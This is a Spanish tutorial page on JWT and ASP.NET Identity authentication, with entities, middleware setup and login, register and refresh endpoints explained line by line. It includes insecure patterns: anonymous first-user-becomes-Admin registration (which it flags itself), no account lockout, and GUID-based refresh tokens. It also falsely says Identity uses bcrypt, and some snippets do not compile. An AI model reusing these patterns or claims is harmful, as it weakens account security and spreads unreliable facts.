---
sidebar_position: 3
title: JWT + Identity
description: Autenticación, autorización, roles, claims y refresh tokens — basado en el video G18.
---

# JWT + Identity

Escúchame. La autenticación es donde la mayoría del código cae.

No porque sea difícil. Sino porque hay decisiones que parecen simples y terminan con tokens robados, sesiones explotadas, y tu jefe preguntando por qué un usuario de 15 años está cambiando permisos en tu DB.

Este capítulo es el mundo real. Código que funciona en producción.

**Video de referencia:** [G18 — Permisos y roles: cómo diseñar auth sin que explote todo](https://youtube.com/@anndev14)

---

## El problema — sin autenticación

```csharp
[HttpPost("create-order")]
public async Task<ActionResult<Order>> CreateOrder(CreateOrderDto dto)
{
    // ¿Quién eres tú?
    // ¿Puedes hacer esto?
    // ¿Eres admin o empleado?
    // No sé. No importa. ADELANTE.

    var order = new Order { /* ... */ };
    await _unitOfWork.Repository<Order>().Add(order);
    await _unitOfWork.Complete();
    return Ok(order);
}
```

Cualquiera que acceda a ese endpoint puede:
- Crear órdenes con precios negativos
- Cambiar al dueño de la orden
- Acceder a órdenes de otros usuarios
- Eliminar datos

*Sin autenticación, tu API es un cajero automático abierto.*

---

## JWT vs Sesiones — la decisión

**Sesiones (tradicional):**

```
Cliente: "Soy Anderson"
    ↓
Servidor: "OK, eres la sesión ABC123"
          [Guarda ABC123 en memoria: {user: Anderson, roles: [Admin]})
    ↓
Cliente envía ABC123 en cada request
    ↓
Servidor busca ABC123 en memoria
    ↓
"Sí, eres Anderson"
```

**Problemas:**
- Si tienes 10 servidores, necesitas sesiones compartidas (Redis)
- Cada request busca en la DB o en caché
- No escala bien en microservicios
- Difícil de revocar — necesitas borrar la sesión en todas partes

**JWT (tokens):**

```
Cliente: "Soy Anderson, Admin, email@test.com, expires 2025-12-20"
         [Firmado con llave privada del servidor]
    ↓
Servidor: "Voy a verificar que está firmado correctamente"
    ↓
"Sí, es auténtico. Confío en el contenido"
    ↓
No guardo nada. El cliente trae toda la info.
```

**Ventajas:**
- Sin estado en el servidor (stateless)
- Escala fácil
- Funciona en microservicios
- El token contiene toda la info

**Desventajas:**
- No puedo revocar un token (problema)
- El token no cambia hasta expirar
- Más grande que una cookie de sesión

**La solución:** JWT corto + Refresh Token largo.

---

## Las entidades — `AppUser`, `AppRole` y `RefreshToken`

Todo empieza aquí: las clases que representan quién eres, qué rol tienes, y el token que te mantiene conectado.

### `AppUser` — el usuario

```csharp
public class AppUser : IdentityUser<Guid>
{
    public string FirstName { get; set; } = string.Empty;
    public string LastName { get; set; } = string.Empty;
    public Guid? TenantId { get; set; }
    public bool IsActive { get; set; } = true;
    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
    public DateTime? LastLoginAt { get; set; }

    public string FullName => $"{FirstName} {LastName}";

    public void RecordLogin()
    {
        LastLoginAt = DateTime.UtcNow;
    }
}
```

`IdentityUser<Guid>` es la clase base de ASP.NET Identity. Ya tiene `Id`, `Email`, `PasswordHash`, `PhoneNumber`, etc.

`TenantId` es para multi-tenancy — cada usuario pertenece a un tenant (una clínica, una empresa). Si tu app no es multi-tenant, quítalo.

#### Línea por línea

```csharp
public class AppUser : IdentityUser<Guid>
```

Hereda de `IdentityUser<Guid>`. El `<Guid>` indica que el ID del usuario será un `Guid` en vez de un string. Identity ya te da: `Id`, `UserName`, `Email`, `EmailConfirmed`, `PasswordHash`, `PhoneNumber`, `TwoFactorEnabled` y más — no los tienes que declarar.

```csharp
public string FirstName { get; set; } = string.Empty;
public string LastName { get; set; } = string.Empty;
```

Tus propios campos. `= string.Empty` los inicializa vacíos — evita `null` por accidente.

```csharp
public Guid? TenantId { get; set; }
```

El tenant al que pertenece el usuario. Es `nullable` (`?`) porque el primer usuario (admin global) puede no tener tenant.

```csharp
public bool IsActive { get; set; } = true;
public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
public DateTime? LastLoginAt { get; set; }
```

`IsActive` permite desactivar cuentas sin borrarlas (auditoría). `CreatedAt` se auto-inicializa con la fecha actual. `LastLoginAt` se registra en cada login.

```csharp
public string FullName => $"{FirstName} {LastName}";
```

Propiedad calculada (solo lectura) — devuelve el nombre completo. No se guarda en la DB, se compone al leerla.

```csharp
public void RecordLogin()
{
    LastLoginAt = DateTime.UtcNow;
}
```

Método de dominio — encapsula la lógica de "registrar un login" dentro de la entidad, en vez de hacerlo desde afuera.

### `AppRole` — el rol

```csharp
public class AppRole : IdentityRole<Guid>
{
    public string? Description { get; set; }
}
```

Igual que `AppUser`, pero para roles. `IdentityRole<Guid>` ya trae `Id`, `Name` y `NormalizedName`. Lo único que agregas es un `Description` para documentar qué hace cada rol — útil para auditoría y para el dashboard de administración.

Los roles son las **categorías amplias** de permisos: Admin, Manager, Employee. En la siguiente sección vemos cómo se crean.

### `RefreshToken` — la llave de repuesto

```csharp
public class RefreshToken
{
    public Guid Id { get; private set; } = Guid.NewGuid();
    public string Token { get; private set; } = null!;
    public Guid UserId { get; private set; }
    public DateTime ExpiresAt { get; private set; }
    public DateTime CreatedAt { get; private set; }
    public bool IsRevoked { get; private set; }
    public string? RevokedReason { get; private set; }

    // Propiedades calculadas
    public bool IsExpired => DateTime.UtcNow >= ExpiresAt;
    public bool IsActive => !IsRevoked && !IsExpired;

    public static RefreshToken Create(Guid userId, int expirationDays = 7)
    {
        return new RefreshToken
        {
            Token = Convert.ToBase64String(Guid.NewGuid().ToByteArray()) +
                    Convert.ToBase64String(Guid.NewGuid().ToByteArray()),
            UserId = userId,
            ExpiresAt = DateTime.UtcNow.AddDays(expirationDays),
            CreatedAt = DateTime.UtcNow,
            IsRevoked = false
        };
    }

    public void Revoke(string reason = "Manually revoked")
    {
        IsRevoked = true;
        RevokedReason = reason;
    }
}
```

**Por qué esta estructura:**

`IsActive` es una propiedad calculada que verifica si el token **aún sirve**. No confundir con `IsRevoked`:
- `IsRevoked = true` → alguien lo borró explícitamente
- `IsExpired = true` → pasó la fecha
- `IsActive = false` → si cualquiera de los dos es true

#### Línea por línea

```csharp
public Guid Id { get; private set; } = Guid.NewGuid();
```

El ID del registro en la DB, autogenerado. `private set` — no se puede cambiar desde afuera.

```csharp
public string Token { get; private set; } = null!;
```

El valor del token en sí. `null!` le dice al compilador "confía en mí, esto nunca será null" — se asigna en `Create`.

```csharp
public Guid UserId { get; private set; }
```

A qué usuario pertenece el token. Con esto, al recibir un token puedes buscar al usuario.

```csharp
public DateTime ExpiresAt { get; private set; }
public DateTime CreatedAt { get; private set; }
public bool IsRevoked { get; private set; }
public string? RevokedReason { get; private set; }
```

Fechas de expiración y creación, el flag de revocado, y una razón opcional (por qué se revocó — útil para auditoría).

```csharp
public bool IsExpired => DateTime.UtcNow >= ExpiresAt;
```

Propiedad calculada: `true` si la fecha actual ya pasó la de expiración.

```csharp
public bool IsActive => !IsRevoked && !IsExpired;
```

Propiedad calculada: el token sirve SOLO si no fue revocado Y no expiró. Ambas condiciones.

```csharp
public static RefreshToken Create(Guid userId, int expirationDays = 7)
```

Factory estático — el único lugar donde se crea un token válido. Centraliza la lógica de creación para que nadie cree un token malformado desde afuera.

```csharp
public void Revoke(string reason = "Manually revoked")
{
    IsRevoked = true;
    RevokedReason = reason;
}
```

Método de dominio — marca el token como revocado y guarda la razón. No hay forma de des-revocar.

---

## Definir los roles — el seeding en la DB

Los roles se crean una sola vez, con una migración. El patrón es una configuración de EF Core:

```csharp
public class AppRoleConfiguration : IEntityTypeConfiguration<AppRole>
{
    public void Configure(EntityTypeBuilder<AppRole> builder)
    {
        var roles = new List<AppRole>()
        {
            new AppRole 
            { 
                Id = "b9bcdce5-1080-4dfb-a4d9-a8f64867f055", 
                Name = "Admin", 
                NormalizedName = "ADMIN",
                Description = "Global System Administrator (access to all tenants)"
            },
            new AppRole 
            { 
                Id = "d25edb8a-ff80-4aab-b859-6e0190eec8e3", 
                Name = "Manager", 
                NormalizedName = "MANAGER",
                Description = "Manager with limited permissions per tenant"
            },
            new AppRole 
            { 
                Id = "fe3bafcd-101b-4a2e-b69a-89356b5d0f92", 
                Name = "Employee", 
                NormalizedName = "EMPLOYEE",
                Description = "Employee with limited permissions by area"
            }
        };
        builder.HasData(roles);
    }
}
```

### Línea por línea

```csharp
public class AppRoleConfiguration : IEntityTypeConfiguration<AppRole>
```

Una configuración de EF Core — le dice a EF cómo mapear la entidad `AppRole` en la DB. El patrón `IEntityTypeConfiguration<T>` separa la config de la entidad en su propia clase.

```csharp
builder.HasData(roles);
```

`HasData` es el *data seeding* de EF Core — inserta estos roles cuando se aplica una migración. Así los roles existen desde el día uno, sin tener que crearlos a mano.

```csharp
Id = "b9bcdce5-1080-4dfb-a4d9-a8f64867f055",
Name = "Admin",
NormalizedName = "ADMIN",
```

`Id` es un GUID fijo (no aleatorio) — así la migración es determinista y no genera uno nuevo cada vez. `NormalizedName` siempre en mayúsculas — Identity usa esto internamente para las comparaciones de roles.

### Los nombres de roles — `RoleNames`

Verás `RoleNames.Admin`, `RoleNames.Manager` por todo el código. Es solo una clase de constantes para no escribir strings sueltos:

```csharp
public static class RoleNames
{
    public const string Admin = "Admin";
    public const string Manager = "Manager";
    public const string Employee = "Employee";
}
```

`const` — un valor que jamás cambia en runtime. Si escribes `"Admin"` en 20 lugares y alguien lo renombra a `"Administrator"`, tienes que corregir 20 strings. Con `RoleNames.Admin`, corriges 1 lugar y el compilador te avisa si te olvidaste de algún uso.

---

## Program.cs — el armado

Ahora que existen las entidades, hay que registrarlas. Dos bloques: primero Identity (las reglas de usuario y contraseña) y después el middleware de autenticación/ autorización.

### Identity — las reglas

```csharp
public static class AplicationServicesExtensions
{
    public static IServiceCollection AddApplicationServices(
        this IServiceCollection services, IConfiguration config)
    {
        // DbContext
        services.AddDbContext<AppContext>(opt =>
        {
            opt.UseSqlServer(config.GetConnectionString("DefaultConnection"));
        });

        // Identity — las reglas de contraseña
        services.AddIdentity<AppUser, AppRole>(opt =>
                {
                    opt.User.RequireUniqueEmail = true;
                    opt.SignIn.RequireConfirmedEmail = true;
                    opt.Password.RequireDigit = true;
                    opt.Password.RequireNonAlphanumeric = true;
                    opt.Password.RequireUppercase = true;
                    opt.Password.RequireLowercase = true;
                    opt.Password.RequiredLength = 8;
                }
            )
            .AddEntityFrameworkStores<AppContext>()
            .AddDefaultTokenProviders();

        return services;
    }
}
```

#### Línea por línea

```csharp
services.AddDbContext<AppContext>(opt =>
{
    opt.UseSqlServer(config.GetConnectionString("DefaultConnection"));
});
```

Registra el DbContext en DI con la cadena de conexión del `appsettings.json`. El `AppContext` es el mismo DbContext de las páginas anteriores — aquí vive la tabla de usuarios de Identity además de tus entidades de negocio.

```csharp
services.AddIdentity<AppUser, AppRole>(opt =>
```

`AddIdentity<TUser, TRole>` le dice a ASP.NET que uses Identity para usuarios (`AppUser`) y roles (`AppRole`). Todo lo demás — `_userManager`, `_signInManager`, las tablas `AspNetUsers`, `AspNetRoles` — sale de aquí.

```csharp
opt.User.RequireUniqueEmail = true;
```

No puede haber dos usuarios con el mismo email. Point.

```csharp
opt.SignIn.RequireConfirmedEmail = true;
```

Hasta que no confirmen el email, no pueden loguear. Extra seguro.

```csharp
opt.Password.RequireDigit = true;
opt.Password.RequireNonAlphanumeric = true;
opt.Password.RequireUppercase = true;
opt.Password.RequireLowercase = true;
opt.Password.RequiredLength = 8;
```

Contraseña debe tener al menos 8 caracteres, números, símbolos, mayúsculas, minúsculas.

*Sí, es restrictivo. Sí, los usuarios van a quejarse. Sí, está bien.*

```csharp
.AddEntityFrameworkStores<AppContext>()
.AddDefaultTokenProviders();
```

Le dices a Identity dónde guardar los usuarios (EF Core) y que use los token providers predeterminados.

### Authentication + Authorization — el middleware

```csharp
services.AddAuthentication(opt =>
{
    opt.DefaultAuthenticateScheme =
        opt.DefaultChallengeScheme =
            opt.DefaultForbidScheme =
                opt.DefaultScheme =
                    opt.DefaultSignInScheme =
                        opt.DefaultSignOutScheme = JwtBearerDefaults.AuthenticationScheme;
})
.AddJwtBearer(opt =>
{
    opt.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = true,
        ValidIssuer = config["Token:Issuer"],
        ValidateAudience = true,
        ValidAudience = config["Token:Audience"],
        ValidateIssuerSigningKey = true,
        IssuerSigningKey = new SymmetricSecurityKey(
            System.Text.Encoding.UTF8.GetBytes(config["Token:Key"])
        ),
        ValidateLifetime = true,
        ClockSkew = TimeSpan.Zero,
    };
});

services.AddAuthorization(opt =>
{
    opt.AddPolicy("RequireAdmin",
        policy => policy.RequireRole(RoleNames.Admin));
    opt.AddPolicy("RequireManager",
        policy => policy.RequireRole(RoleNames.Manager));
    opt.AddPolicy("RequireEmployeeOrManager",
        policy => policy.RequireRole(RoleNames.Manager, RoleNames.Employee));
});
```

#### Qué significa cada línea

```csharp
ValidateIssuer = true,
ValidIssuer = config["Token:Issuer"],
```

El token debe decir quién lo emitió. Si tu app dice "emitido por api.mediflow.com" y alguien manda un token que dice "emitido por malicious.com", lo rechazas.

```csharp
ValidateAudience = true,
ValidAudience = config["Token:Audience"],
```

El token debe estar dirigido a TI. Un token emitido para otra app no sirve en la tuya.

```csharp
ValidateIssuerSigningKey = true,
IssuerSigningKey = new SymmetricSecurityKey(
    System.Text.Encoding.UTF8.GetBytes(config["Token:Key"])
),
```

**Crítico.** La misma llave que **firmó** el token es la que **valida**. Si alguien cambió el token sin la llave privada, la validación falla.

```csharp
ValidateLifetime = true,
ClockSkew = TimeSpan.Zero,
```

Verifica que el token no expiró. `ClockSkew = TimeSpan.Zero` significa "sin tolerancia". Si expira a las 3:00:00, a las 3:00:01 es inválido.

*Algunos dejan ClockSkew de 60 segundos para tolerar desincronización de relojes. Depende de cuánto confíes en la sincronización de servidores.*

### La config de Token en appsettings.json

Todo lo anterior lee de `config["Token:..."]`. Así se ve en `appsettings.json`:

```json
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=...;Database=MediFlow;..."
  },
  "Token": {
    "Issuer": "https://api.mediflow.com",
    "Audience": "https://mediflow.com",
    "Key": "TU_LLAVE_SECRETA_SUPER_LARGA_MINIMO_32_CARACTERES"
  }
}
```

**`Key` es EL secreto más importante de tu app.** Se usa para firmar Y validar los tokens. Reglas de oro:
- Mínimo 32 caracteres (los algoritmos de firma lo exigen)
- **Nunca** en el código — va en appsettings, secrets, o variables de entorno
- Nunca se sube a git (usa `.gitignore` o user-secrets en desarrollo)
- Si se filtra, cualquiera puede firmar tokens de Admin — rotación inmediata

`Issuer` y `Audience` se usan para validar que el token fue emitido por ti y para ti — los viste en el middleware de arriba.

---

## El orden del middleware en Program.cs

Todo lo anterior solo funciona si el pipeline está armado en el orden correcto:

```csharp
var app = builder.Build();

app.UseMiddleware<ExceptionMiddleware>(); // 1. Primero
app.UseStatusCodePagesWithReExecute("/errors/{0}");

if (app.Environment.IsDevelopment()) app.MapOpenApi();

app.UseHttpsRedirection(); // 2. HTTPS

app.UseAuthentication();  // 3. ¿Quién eres?
app.UseAuthorization();  // 4. ¿Puedes hacer esto?

app.UseMiddleware<TenantResolver>(); // 5. Tenant específico

app.MapControllers();

app.Run();
```

**Orden crítico:**

- `ExceptionMiddleware` primero (atrapa todo)
- `Authentication` antes de `Authorization` (no puedes autorizar sin autenticar)
- `TenantResolver` después (necesita el user autenticado)

### Línea por línea

```csharp
app.UseMiddleware<ExceptionMiddleware>(); // 1. Primero
```

El middleware de excepciones va PRIMERO para que envuelva todo el pipeline. Si cualquier middleware o controller lanza una excepción, este la atrapa y devuelve un `ApiResponse` consistente (el patrón de la página de Manejo de errores). Si fuera más abajo, las excepciones de los middlewares anteriores se escaparían sin formato.

```csharp
app.UseStatusCodePagesWithReExecute("/errors/{0}");
```

Intercepta respuestas de status code sin cuerpo (404, 500, etc.) y las re-ejecuta en un endpoint de errores. Da una respuesta JSON consistente en vez de una página plana.

```csharp
if (app.Environment.IsDevelopment()) app.MapOpenApi();
```

El OpenAPI (Swagger) solo se expone en desarrollo. En producción lo apagas — no quieres que cualquiera vea tu contrato de API.

```csharp
app.UseHttpsRedirection(); // 2. HTTPS
```

Fuerza HTTPS. **Obligatorio** — sin esto, los tokens viajan en texto plano por la red.

```csharp
app.UseAuthentication(); // 3. ¿Quién eres?
app.UseAuthorization(); // 4. ¿Puedes hacer esto?
```

El par inseparable. `UseAuthentication` lee el token del request y construye `User` (¿quién eres?). `UseAuthorization` evalúa los `[Authorize]` y policies contra ese `User` (¿puedes hacer esto?). **El orden importa — no puedes autorizar a alguien que no has autenticado.**

```csharp
app.UseMiddleware<TenantResolver>();  // 5. Tenant específico
```

Resuelve el tenant del request — pero solo puede hacerlo DESPUÉS de que `UseAuthentication` construyó al usuario, porque necesita leer el `TenantId` del claim para saber a qué tenant pertenece el request.

```csharp
app.MapControllers();
app.Run();
```

`MapControllers` enruta los requests a los controllers. `Run` arranca el pipeline. Todo lo que viene después de `Run` nunca se ejecuta.

---

## Crear el token — el service

Con las entidades y el middleware listos, necesitas el código que **construye** el JWT. Aquí tienes dos enfoques.

### Enfoque 1: JWT de 7 días (sin refresh)

*Simplista pero funcional para startups pequeñas.*

```csharp
public async Task<string> CreateToken(AppUser user)
{
    var claims = new List<Claim>
    {
        new Claim(ClaimTypes.NameIdentifier, user.Id),
        new Claim(ClaimTypes.Email, user.Email ?? ""),
        new Claim(ClaimTypes.Name, user.UserName ?? ""),
    };

    var roles = await _userManager.GetRolesAsync(user);
    foreach (var role in roles.Distinct())
    {
        claims.Add(new Claim(ClaimTypes.Role, role));
    }

    var creds = new SigningCredentials(_key, SecurityAlgorithms.HmacSha512Signature);
    var tokenDescriptor = new SecurityTokenDescriptor
    {
        Subject = new ClaimsIdentity(claims),
        Expires = DateTime.UtcNow.AddDays(7), // 👈 7 días sin refresh
        SigningCredentials = creds,
        Issuer = _config["Token:Issuer"],
        Audience = _config["Token:Audience"]
    };

    var tokenHandler = new JwtSecurityTokenHandler();
    var token = tokenHandler.CreateToken(tokenDescriptor);

    return tokenHandler.WriteToken(token);
}
```

**Cuándo usar:**
- App pequeña, baja seguridad
- Prototipo
- Cuando "revocación" no es crítica

**Cuándo NO:**
- App médica, financiera, o sensible
- Muchos usuarios
- Si alguien roba el token, vive 7 días

#### Línea por línea

```csharp
public async Task<string> CreateToken(AppUser user)
```

El método que construye el JWT. Recibe el usuario autenticado y devuelve el token como string — eso es lo que se manda al cliente.

```csharp
var claims = new List<Claim>
{
    new Claim(ClaimTypes.NameIdentifier, user.Id),
    new Claim(ClaimTypes.Email, user.Email ?? ""),
    new Claim(ClaimTypes.Name, user.UserName ?? ""),
};
```

Los **claims** son datos sobre el usuario que viajan dentro del token. Aquí metemos tres: su ID (`NameIdentifier`), su email y su nombre de usuario. `?? ""` evita que si el email es null, el claim explote.

```csharp
var roles = await _userManager.GetRolesAsync(user);
foreach (var role in roles.Distinct())
{
    claims.Add(new Claim(ClaimTypes.Role, role));
}
```

Consulta los roles del usuario (Admin, Manager, Employee...) y los agrega como claims. `Distinct()` evita roles duplicados. Con esto, el token ya dice "quién eres" (claims) y "qué puedes hacer" (roles).

```csharp
var creds = new SigningCredentials(_key, SecurityAlgorithms.HmacSha512Signature);
```

Las credenciales de firma. `_key` es una llave secreta guardada en la config del servidor. `HmacSha512` es el algoritmo de firma. Esta llave **nunca debe salir del servidor** — si se filtra, cualquiera puede firmar tokens válidos.

```csharp
var tokenDescriptor = new SecurityTokenDescriptor
{
    Subject = new ClaimsIdentity(claims),
    Expires = DateTime.UtcNow.AddDays(7), // 👈 7 días sin refresh
    SigningCredentials = creds,
    Issuer = _config["Token:Issuer"],
    Audience = _config["Token:Audience"]
};
```

El descriptor reúne todo: los claims (`Subject`), la expiración, la firma, quién emite (`Issuer`) y a quién va dirigido (`Audience`).

```csharp
var tokenHandler = new JwtSecurityTokenHandler();
var token = tokenHandler.CreateToken(tokenDescriptor);
return tokenHandler.WriteToken(token);
```

`JwtSecurityTokenHandler` es la clase de ASP.NET que sabe construir JWTs. `CreateToken` lo arma y `WriteToken` lo serializa al formato de tres partes que viaja en el header: `header.payload.signature`.

### Enfoque 2: JWT corto + Refresh Token (profesional)

*La forma que usa el mundo real.* El JWT corto (60 min) expira rápido; el RefreshToken largo (7 días) lo renueva sin que el usuario vuelva a loguear.

```csharp
// JWT vive 60 minutos
Expires = DateTime.UtcNow.AddMinutes(60)

// RefreshToken vive 7 días
var refreshToken = RefreshToken.Create(userId); // 👈 visto en la entidad
```

**El flujo:**

```
POST /auth/login → email + password
    ↓
Valida credenciales
    ↓
Crea JWT (60 min) + RefreshToken (7 días)
    ↓
Response: { jwt, refreshToken, expiresIn: 3600 }
    ↓
Cliente guarda ambos
    ↓
Cliente usa JWT en cada request (Header: "Authorization: Bearer <JWT>")
    ↓
En 60 minutos, JWT expira
    ↓
Cliente envía RefreshToken a POST /auth/refresh
    ↓
Servidor valida RefreshToken
    ↓
Genera JWT nuevo + RefreshToken nuevo (rotation)
    ↓
Revoca RefreshToken viejo
    ↓
Cliente actualiza ambos
```

*Sin que el usuario tenga que loguear de nuevo.*

La única diferencia contra el Enfoque 1 es el tiempo de vida: **60 minutos en vez de 7 días**. El `RefreshToken.Create` ya lo viste completo y línea por línea en la sección de entidades — aquí solo se invoca con `RefreshToken.Create(userId)`.

---

## `BuildAuthResponseAsync` — el helper que junta todo

Se menciona en login, refresh y register: es el método que arma la respuesta completa. Vive dentro del AuthController:

```csharp
private async Task<AuthResponse> BuildAuthResponseAsync(
    AppUser user, IList<string> roles)
{
    // 1. Crear el JWT
    var jwt = await CreateToken(user);

    // 2. Crear el RefreshToken nuevo
    var refreshToken = RefreshToken.Create(user.Id);

    // 3. Guardarlo en la DB
    _context.RefreshTokens.Add(refreshToken);
    await _context.SaveChangesAsync();

    // 4. Devolver todo junto
    return new AuthResponse
    {
        Jwt = jwt,
        RefreshToken = refreshToken.Token,
        ExpiresIn = 3600 // 60 minutos en segundos
    };
}
```

### Línea por línea

```csharp
var jwt = await CreateToken(user);
```

El JWT corto — el método de la sección anterior. `await` porque consulta roles en la DB.

```csharp
var refreshToken = RefreshToken.Create(user.Id);
```

El RefreshToken largo — el factory de la entidad. No toca la DB todavía, solo construye el objeto en memoria.

```csharp
_context.RefreshTokens.Add(refreshToken);
await _context.SaveChangesAsync();
```

**Aquí pasa algo importante:** el JWT NO se guarda en la DB — es stateless. Pero el RefreshToken SÍ, porque necesitas poder revocarlo y validarlo después. Por eso es un registro en la tabla `RefreshTokens`.

```csharp
return new AuthResponse
{
    Jwt = jwt,
    RefreshToken = refreshToken.Token,
    ExpiresIn = 3600 // 60 minutos en segundos
};
```

El contrato que recibe el cliente. `ExpiresIn` le dice al frontend cuándo tiene que ir a refrescar.

Este helper se usa en login, refresh y register — es la única forma de construir una respuesta de auth, así nadie olvida guardar el refresh token en la DB.

---

## El controller — register

La puerta de entrada inversa: crear la cuenta. Aquí también se resuelve el "primer usuario".

```csharp
[HttpPost("register")]
[AllowAnonymous]
public async Task<ActionResult<AuthResponse>> Register(
    [FromBody] RegisterRequest request)
{
    // 1. Crear el usuario
    var user = new AppUser
    {
        UserName = request.Email,
        Email = request.Email,
        FirstName = request.FirstName,
        LastName = request.LastName,
        TenantId = request.TenantId
    };

    var result = await _userManager.CreateAsync(user, request.Password);
    if (!result.Succeeded)
        throw new ValidationException(result.Errors.Select(e => e.Description));

    // 2. Asignar rol según el día cero
    var isFirstUser = !await _userManager.Users.AnyAsync();
    var role = isFirstUser ? "Admin" : "Employee";
    await _userManager.AddToRoleAsync(user, role);

    // 3. Autenticarlo de una vez (login implícito)
    var roles = await _userManager.GetRolesAsync(user);
    return Ok(await BuildAuthResponseAsync(user, roles));
}
```

### Línea por línea

```csharp
var user = new AppUser
{
    UserName = request.Email,
    Email = request.Email,
    ...
};
```

Construye la entidad `AppUser` con los datos del request. Fíjate que **no** le pones `Password` — eso nunca va en el objeto.

```csharp
var result = await _userManager.CreateAsync(user, request.Password);
if (!result.Succeeded)
    throw new ValidationException(result.Errors.Select(e => e.Description));
```

`CreateAsync` recibe el usuario y la contraseña **en plano**, y Identity la hashea internamente (bcrypt) antes de guardarla. Nunca verás la contraseña en la DB. Si algo falla (email duplicado, contraseña débil), `result.Errors` trae los mensajes de Identity.

```csharp
var isFirstUser = !await _userManager.Users.AnyAsync();
var role = isFirstUser ? "Admin" : "Employee";
await _userManager.AddToRoleAsync(user, role);
```

**El "día cero":** si la tabla de usuarios está vacía, este usuario es Admin (quien instala el sistema). Los demás entran como Employee. `AddToRoleAsync` crea el registro en la tabla de relación usuario-rol.

```csharp
var roles = await _userManager.GetRolesAsync(user);
return Ok(await BuildAuthResponseAsync(user, roles));
```

El registro **loguea implícitamente** — reusa el mismo helper que login para devolver JWT + RefreshToken. El usuario se registra y ya entra.

### ¿El primer usuario Admin es inseguro?

Sí, un poco. El registro es `[AllowAnonymous]`, así que cualquiera que llegue primero es Admin. Para producción, mejor:

```csharp
if (isFirstUser)
{
    // Requiere aprobación manual
    _logger.LogWarning("First user registered, pending admin approval");
    await _emailService.NotifyAdminsAsync(user.Email);
    // No asignas rol automáticamente
}
else
{
    // Usuarios normales
    await _userManager.AddToRoleAsync(user, "Employee");
}
```

---

## El controller — login

Ya tienes las piezas. Ahora la puerta de entrada: el login.

```csharp
[HttpPost("login")]
[AllowAnonymous]
public async Task<ActionResult<AuthResponse>> Login(
    [FromBody] LoginRequest request)
{
    var user = await _userManager.FindByEmailAsync(request.Email);
    if (user is null)
        throw new UnauthorizedException("Invalid credentials");

    if (!user.IsActive)
        throw new UnauthorizedException("Account is inactive");

    var result = await _signInManager.CheckPasswordSignInAsync(
        user, request.Password, lockoutOnFailure: false);

    if (!result.Succeeded)
        throw new UnauthorizedException("Invalid credentials");

    user.RecordLogin();
    await _userManager.UpdateAsync(user);

    var roles = await _userManager.GetRolesAsync(user);
    return Ok(await BuildAuthResponseAsync(user, roles));
}
```

### Línea por línea

```csharp
[AllowAnonymous]
```

Este endpoint puede ser accedido sin token. Lógico — si necesitas un token para loguear, nunca loguas.

```csharp
var user = await _userManager.FindByEmailAsync(request.Email);
if (user is null)
    throw new UnauthorizedException("Invalid credentials");
```

Busca el usuario por email. Si no existe, lanza excepción. **Nota:** el mensaje es ambiguo ("Invalid credentials"). NO dices "usuario no existe" — eso le dice al attacker que ese email está registrado.

```csharp
if (!user.IsActive)
    throw new UnauthorizedException("Account is inactive");
```

Un admin puede desactivar cuentas sin borrarlas. Práctico para auditoría.

```csharp
var result = await _signInManager.CheckPasswordSignInAsync(
    user, request.Password, lockoutOnFailure: false);
```

`CheckPasswordSignInAsync` valida la contraseña **hasheada** contra la que el usuario pasó. Nunca guardas la contraseña en plain text. Identity usa bcrypt por defecto.

```csharp
user.RecordLogin();
await _userManager.UpdateAsync(user);
```

Registra cuándo fue el último login. Útil para auditoría y detección de fraude.

```csharp
var roles = await _userManager.GetRolesAsync(user);
return Ok(await BuildAuthResponseAsync(user, roles));
```

Consulta los roles del usuario y construye la respuesta final: el JWT, el RefreshToken y la expiración. `BuildAuthResponseAsync` es el helper que junta todo — crear el JWT, crear el RefreshToken nuevo, guardarlo en la DB y devolver `{ jwt, refreshToken, expiresIn }`.

---

## El refresh token — mantener la sesión viva

```csharp
[HttpPost("refresh")]
[AllowAnonymous]
public async Task<ActionResult<AuthResponse>> Refresh(
    [FromBody] RefreshTokenRequest request)
{
    var refreshToken = await _context.RefreshTokens
        .FirstOrDefaultAsync(x => x.Token == request.RefreshToken);

    if (refreshToken is null)
        throw new UnauthorizedException("Invalid refresh token");

    if (!refreshToken.IsActive)
    {
        var reason = refreshToken.IsRevoked ? "Token has been revoked" : "Token has expired";
        throw new UnauthorizedException(reason);
    }

    var user = await _userManager.FindByIdAsync(refreshToken.UserId.ToString());
    if (user is null || !user.IsActive)
        throw new UnauthorizedException("User not found or inactive");

    // Revocar el token actual y generar uno nuevo (rotation)
    refreshToken.Revoke("Replaced by new token");
    await _context.SaveChangesAsync();

    var roles = await _userManager.GetRolesAsync(user);
    return Ok(await BuildAuthResponseAsync(user, roles));
}
```

### El flujo

1. Cliente manda RefreshToken
2. Buscas el token en la DB
3. Verificas que está activo (no revocado, no expirado)
4. Verificas que el usuario existe y está activo
5. Revocas el RefreshToken viejo
6. Generas JWT nuevo + RefreshToken nuevo
7. Cliente guarda ambos

**Rotation de tokens:** Cada vez que usa RefreshToken, genera uno nuevo. Si alguien robó el token viejo, ya no sirve después de que lo uses.

### Línea por línea

```csharp
[HttpPost("refresh")]
[AllowAnonymous]
```

Endpoint público (sin token, obvio — el JWT ya expiró, por eso se refresca).

```csharp
var refreshToken = await _context.RefreshTokens
    .FirstOrDefaultAsync(x => x.Token == request.RefreshToken);
```

Busca el token en la DB por su valor. `FirstOrDefaultAsync` devuelve el primero que coincida o `null` si no existe. El token NO viene en el header `Authorization` — viene en el body del request, porque el JWT ya no es válido.

```csharp
if (refreshToken is null)
    throw new UnauthorizedException("Invalid refresh token");
```

Si el token no existe en la DB, lo rechazas. Mensaje genérico para no revelar nada al attacker.

```csharp
if (!refreshToken.IsActive)
{
    var reason = refreshToken.IsRevoked ? "Token has been revoked" : "Token has expired";
    throw new UnauthorizedException(reason);
}
```

`IsActive` cubre ambos casos: revocado o expirado. El mensaje distingue cuál — para el usuario legítimo es info útil; para un attacker no le da ventaja.

```csharp
var user = await _userManager.FindByIdAsync(refreshToken.UserId.ToString());
if (user is null || !user.IsActive)
    throw new UnauthorizedException("User not found or inactive");
```

El token pertenece a un `UserId` — busca al usuario. Doble check: existe Y está activo. Un usuario desactivado no puede refrescar sesiones.

```csharp
refreshToken.Revoke("Replaced by new token");
await _context.SaveChangesAsync();
```

**La rotación.** Antes de generar el nuevo token, revocas el viejo y lo guardas. Si el token viejo fue robado, ya no sirve después de este momento.

```csharp
var roles = await _userManager.GetRolesAsync(user);
